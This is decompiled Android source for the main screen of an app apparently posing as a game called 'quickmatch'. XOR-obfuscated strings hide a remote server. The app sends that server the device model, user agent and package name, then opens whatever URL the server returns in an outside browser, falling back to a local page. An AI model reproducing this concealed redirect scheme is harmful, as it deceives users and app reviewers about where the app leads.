package com.playminus.quickmatch;

import H.e;
import K.A0;
import K.y0;
import P0.c;
import T.t;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.playminus.quickmatch.MainActivity;
import com.playminus.quickmatch.R;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import i1.p;
import j1.b;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.TimeUnit;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1864D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1865A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1866B;

    /* renamed from: C, reason: collision with root package name */
    public String f1867C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1868y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1869z;

    public MainActivity() {
        this.d.f2376b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        this.f1868y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1864D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1869z = t(new byte[]{69, -43, -81});
        this.f1865A = t(new byte[]{84, -58, -70, -75});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {38, 179, 200, 217};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1912a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1866B = getSharedPreferences(this.f1869z, 0);
        setContentView(v().f617a);
        u();
        WebSettings settings = v().f618b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        v().f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1866B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1865A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1867C = string;
            x(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{25, -46, -72, -87, 27});
        String str = t(new byte[]{78, -57, -68, -87, 85, -119, -25, -10, 81, -38, -90, -83, 67, -63, -27, -65, 84, -36, -69, -83, 11, -121, -6, -69, 66, -99, -92, -96, 82, -59, -66, -82, 72, -48, -85, -12, 72, -46, -68, -68, 67, -124, -2, -9, 81, -36, -70, -78, 67, -63, -69, -9, 66, -42, -66, -10}) + t2 + packageName;
        o oVar = new o();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        d.e(timeUnit, "unit");
        byte[] bArr = b.f2603a;
        long millis = timeUnit.toMillis(5L);
        if (millis > 2147483647L) {
            throw new IllegalArgumentException("timeout".concat(" too large.").toString());
        }
        if (millis == 0) {
            throw new IllegalArgumentException("timeout".concat(" too small.").toString());
        }
        oVar.f2472r = (int) millis;
        p pVar = new p(oVar);
        t tVar = new t(4);
        d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f747a = lVar.a();
        String t3 = t(new byte[]{126, -98, -116, -68, 80, -38, -85, -68, 11, -2, -89, -67, 67, -33});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{103, -48, -85, -68, 86, -57, -27, -107, 71, -35, -81, -84, 71, -44, -83}), t(new byte[]{67, -35, -27, -116, 117, -97, -83, -73, 29, -62, -11, -23, 8, -118}));
        String t4 = t(new byte[]{115, -64, -83, -85, 11, -14, -81, -68, 72, -57});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        e b2 = tVar.b();
        j jVar = new j(pVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3231e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3571a;
        jVar.f3232f = n.f3571a.g();
        t tVar2 = pVar.f2478a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f748b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f749c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f748b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3224b = gVar2.f3224b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1867C;
        if (str != null) {
            x(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final O0.a v() {
        return (O0.a) this.f1868y.a();
    }

    public final void w() {
        v().f618b.setVisibility(0);
        v().f618b.loadUrl(t(new byte[]{64, -38, -92, -68, 28, -100, -25, -10, 71, -35, -84, -85, 73, -38, -84, -122, 71, -64, -69, -68, 82, -100, -95, -73, 66, -42, -80, -9, 78, -57, -91, -75}));
    }

    public final void x(String str) {
        v().f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            w();
        }
    }
}
